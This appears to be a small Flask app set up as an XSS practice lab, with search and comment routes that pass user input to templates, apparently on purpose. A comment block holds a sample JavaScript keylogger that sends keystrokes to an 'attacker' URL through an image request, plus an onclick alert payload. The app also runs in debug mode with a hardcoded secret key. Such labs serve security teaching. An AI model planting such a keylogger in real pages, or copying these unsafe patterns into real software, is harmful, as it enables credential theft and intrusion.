from flask import Flask, render_template, request, redirect, jsonify, \
    url_for, flash


#<h1 onclick="alert()">hello</h1>
'''
document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    console.log(stroke);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = JSON.stringify(buffer);
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);

'''

app = Flask(__name__)

comments = []

# Display all things
@app.route('/')
def main():
    return render_template('main.html')

@app.route('/comment', methods=['POST'])
def comment():
    if request.method == "POST":
        comm = request.form['comment']
        comments.append(comm)

    return redirect(url_for("main"))

@app.route('/level1', methods=["POST","GET"])
def level1():
    if request.method == "POST":
        return render_template('level1.html',search=True,query=request.form['search'])
    else:
        return render_template('level1.html',search=False)

@app.route('/level2', methods=["POST","GET"])
def level2():
    if request.method == "POST":
        comments.append(request.form['comment'])
    return render_template('level2.html',list=comments)

if __name__ == '__main__':
    app.secret_key = 'super_secret_key'
    app.debug = True
    app.run()
